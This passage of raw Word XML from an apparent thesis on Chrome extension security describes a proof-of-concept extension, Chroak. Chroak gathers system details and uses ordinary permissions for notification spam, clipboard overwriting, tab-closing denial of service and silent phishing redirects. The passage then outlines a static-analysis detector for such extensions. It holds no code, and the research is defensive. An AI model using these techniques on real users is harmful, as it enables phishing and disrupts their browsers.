            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>webRequestBlocking</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w14:paraId="49E31FC5" w14:textId="77777777" w:rsidTr="009D0C1A">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0F54A593" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>debugger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:tcBorders>
              <w:tl2br w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3D60A057" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>nativeMessaging</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3EF3FC54" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3123EA60" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="001A20D5" w:rsidRDefault="009D0C1A" w:rsidP="00807DFE">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29469991" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRDefault="009D0C1A" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="147E10B7" w14:textId="403B6813" w:rsidR="009D0C1A" w:rsidRPr="009D0C1A" w:rsidRDefault="009D0C1A" w:rsidP="009D0C1A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="009D0C1A">
        <w:lastRenderedPageBreak/>
        <w:t>While Google Chrome seems to imply that no malicious activity can be conducted through requesting these “non-special" permissions and there is no indication to the end-user that an extension uses these permissions, Chroak</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[6]</w:t>
      </w:r>
      <w:r w:rsidRPr="009D0C1A">
        <w:t xml:space="preserve"> uses these extension permissions to perform its attacks. In special, the permissions that were used are: background, clipboardWrite, fontSettings, notifications, power, sessions, system.cpu, system.display, system.memory, system.storage and tabs. Notifications and tabs are the only special permissions used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4354096F" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRPr="009D0C1A" w:rsidRDefault="009D0C1A" w:rsidP="009D0C1A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="009D0C1A">
        <w:t>The extension's homepage shows up every time a user opens a new tab. It has action buttons which a user can click to self-inflict (and undo) malicious actions, and it has a list of information that the extension knows about the user's computer at any given time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FAAFB5" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRDefault="009D0C1A" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7133780F" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="122" w:name="_Toc523071505"/>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>Information Gathered</w:t>
      </w:r>
      <w:bookmarkEnd w:id="122"/>
    </w:p>
    <w:p w14:paraId="5E91D853" w14:textId="421481C9" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>Chroak</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[6]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t xml:space="preserve"> extension managed to gather information from the following permissions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C24D22E" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="123" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.tabs</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>: Number of tabs and open windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9FE303" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="124" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.system.cpu</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>: Information about the user’s CPU (number of processors, processor activity time, processor architecture and CPU model).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD4BBB0" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="125" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.system.display</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>: Information about user’s displays.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F31215C" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="126" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.sessions</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>: User’s chrome sessions and number of connected devices.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD998C6" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="127" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.system.memory</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>: User’s total memory and current memory usage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C688F1" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="128" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>window</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>: User’s IP address, network connection status, operating system, system language and chrome version.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53807B6A" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="129" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.system.storage</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>: Number, types and names of mass storage devices attached to the user’s computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030B60A3" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7"/>
    <w:p w14:paraId="6686F97F" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="130" w:name="_Toc523071506"/>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>Attacks</w:t>
      </w:r>
      <w:r w:rsidR="00FE2989">
        <w:t xml:space="preserve"> Performed</w:t>
      </w:r>
      <w:bookmarkEnd w:id="130"/>
    </w:p>
    <w:p w14:paraId="631E6463" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>The attacks carried out by the extension are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFE2659" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t xml:space="preserve">Power Settings: Using </w:t>
      </w:r>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="131" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.power</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>, the extension can prevent user’s computer from suspending on its own. This could result in a user’s laptop battery to be drained faster than expected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7411EBE3" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t xml:space="preserve">Notifications: Using </w:t>
      </w:r>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="132" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.notifications</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>, the extension can spam the user with notifications that keep reappearing when closed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E934F36" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t xml:space="preserve">Clipboard: Using </w:t>
      </w:r>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="133" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.clipboardWrite</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>, the extension can write arbitrary text to the system clipboard. This can cause major annoyance to the user or it can trick the user into navigating to a malicious URL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2452AC40" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BB1FD7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t xml:space="preserve">Font Size Modification: Using </w:t>
      </w:r>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="134" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.fontSettings</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB1FD7">
        <w:t>, the extension can change the default font size. This can not only be annoying for the user, but also can result in a form of DoS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A6E0CE" w14:textId="77777777" w:rsidR="00D5399C" w:rsidRPr="00D5399C" w:rsidRDefault="00D5399C" w:rsidP="00D5399C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00D5399C">
        <w:lastRenderedPageBreak/>
        <w:t>DoS: The denial-of-service attack was executed using no special permissions, where the extension closed all open tabs and kept closing all newly-opened tabs or windows. This makes Chrome impossible to use and the only way to fix this is to restart in dev mode or remove the extension.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270AF23D" w14:textId="77777777" w:rsidR="00D5399C" w:rsidRPr="00D5399C" w:rsidRDefault="00D5399C" w:rsidP="00D5399C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00D5399C">
        <w:t>Phishing: Phishing was the only attack carried out by the extension using the special permission chrome.tabs. When a new tab with a specific URL is opened by the user, the extension silently redirects that tab to an arbitrary URL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FBD8DD" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRPr="009D0C1A" w:rsidRDefault="00BB1FD7" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DBB73CB" w14:textId="77777777" w:rsidR="00FF5199" w:rsidRPr="003D029B" w:rsidRDefault="00FF5199" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="1B5626F6" w14:textId="77777777" w:rsidR="00FF5199" w:rsidRDefault="00FF5199" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="53217AB7" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="466DA608" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="77875BCB" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="1ED96140" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="14749A50" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="58509C2B" w14:textId="77777777" w:rsidR="00BB1FD7" w:rsidRDefault="00BB1FD7" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="278404CD" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="0EB8E486" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="6623970F" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="7E6704FE" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="51378FB7" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="5B913AAB" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="6D848E21" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="114D8A4B" w14:textId="77777777" w:rsidR="002F6DD5" w:rsidRDefault="002F6DD5" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="66BF0DED" w14:textId="77777777" w:rsidR="002F6DD5" w:rsidRDefault="002F6DD5" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="4A861D28" w14:textId="77777777" w:rsidR="002F6DD5" w:rsidRDefault="002F6DD5" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="16195C21" w14:textId="77777777" w:rsidR="002F6DD5" w:rsidRDefault="002F6DD5" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="65F0143C" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="46452F1E" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="672D6C43" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00BA3FA5"/>
    <w:p w14:paraId="549F226D" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="00BB3A9E" w:rsidP="006C7A53">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="135" w:name="_Toc523071507"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>DESIGN</w:t>
      </w:r>
      <w:bookmarkEnd w:id="135"/>
    </w:p>
    <w:p w14:paraId="77F89280" w14:textId="77777777" w:rsidR="00EF4107" w:rsidRPr="00EF4107" w:rsidRDefault="00EF4107" w:rsidP="00EF4107">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="136" w:name="_Toc523071508"/>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Architecture</w:t>
      </w:r>
      <w:bookmarkEnd w:id="136"/>
    </w:p>
    <w:p w14:paraId="16192FB7" w14:textId="77777777" w:rsidR="00EF4107" w:rsidRDefault="00EF4107" w:rsidP="00EF4107">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>The application consists of four parts. The first part receive</w:t>
      </w:r>
      <w:r w:rsidR="002D15C4">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> the message/information from the user. That message is the URL which contains the ID of the extension chosen by the user from the Chrome web store. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4832A8" w14:textId="77777777" w:rsidR="00EF4107" w:rsidRDefault="00EF4107" w:rsidP="00EF4107">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>The second part is the one that use</w:t>
      </w:r>
      <w:r w:rsidR="00A104D3">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> the extension ID to download the source code of the extension. Once the </w:t>
      </w:r>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="137" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>.crx</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> file is downloaded, it will extract all its files in the </w:t>
      </w:r>
      <w:r w:rsidRPr="00A46693">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="138" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“\extensions</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">” directory. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCC3331" w14:textId="192FFC4A" w:rsidR="00EF4107" w:rsidRDefault="00EF4107" w:rsidP="00EF4107">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">The third part is about parsing the source code. After all .js and .html file are listed with their </w:t>
      </w:r>
      <w:r w:rsidR="00247734">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>relative</w:t>
      </w:r>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> path, the parsing process is started. Each file according to its type, is parsed and the Abstract Syntax Tree</w:t>
      </w:r>
      <w:ins w:id="139" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
        <w:r w:rsidR="001D3231">
          <w:rPr>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t xml:space="preserve"> (AST)</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> is generated. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D4C8AE" w14:textId="77777777" w:rsidR="00180DF6" w:rsidRDefault="00EF4107" w:rsidP="00EF4107">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF4107">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>The fourth and final part is where the static analysis is performed. We try to match parts of the source code (using the AST) with rules which indicates suspicious activity and inform the user through warning messages. At the end, when the analysis is finished, all files included in the extensions folder are deleted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092361A7" w14:textId="77777777" w:rsidR="00EF4107" w:rsidRPr="00180DF6" w:rsidRDefault="00EF4107" w:rsidP="00EF4107">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D65FE1D" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRPr="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="006C7A53">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="140" w:name="_Toc523071509"/>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Native Messaging Host</w:t>
      </w:r>
      <w:bookmarkEnd w:id="140"/>
    </w:p>
    <w:p w14:paraId="3CD26C16" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRPr="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00B45673">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C7A53">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Extensions and apps can exchange messages with native applications using a messaging passing API. The native application must register a native messaging host that knows how to communicate with the extension. Chrome starts the host in a separate process and communicates with it using standard input and standard output streams.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8961C1" w14:textId="77777777" w:rsidR="006C7A53" w:rsidRDefault="006C7A53" w:rsidP="00B45673">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
